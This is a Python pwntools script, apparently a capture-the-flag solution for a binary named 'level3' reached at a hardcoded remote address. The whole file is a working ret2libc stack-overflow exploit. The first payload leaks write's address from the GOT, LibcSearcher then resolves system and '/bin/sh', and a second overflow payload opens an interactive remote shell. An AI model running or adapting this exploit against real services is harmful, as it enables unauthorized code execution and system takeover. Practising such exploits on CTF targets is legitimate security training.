from pwn import *
from LibcSearcher import *


#r = process('./level3')


r = remote('111.198.29.45', 35388)
elf = ELF('./level3')
libc1 = ELF('./libc-2.19.so')


write_got = elf.got['write']
write_plt = elf.plt['write']
main_addr = elf.symbols['main']


r.recvuntil('Input:\n')

payload = 'a' * (0x88 + 4) + p32(write_plt) + p32(main_addr) + p32(1) +p32(write_got) + p32(4)

r.sendline(payload)


write_addr = u32(r.recv()[:4])

libc = LibcSearcher("write", write_addr)
add = write_addr - libc.dump('write')
system_addr = add + libc.dump('system')
#bin_addr = add + libc1.search("/bin/sh").next()
bin_addr = add + libc.dump("str_bin_sh")



payload2 = 'a' * (0x88 + 4) + p32(system_addr) + "aaaa" + p32(bin_addr)

r.recvuntil("Input:\n")
r.sendline(payload2)

r.interactive()








r.interactive()
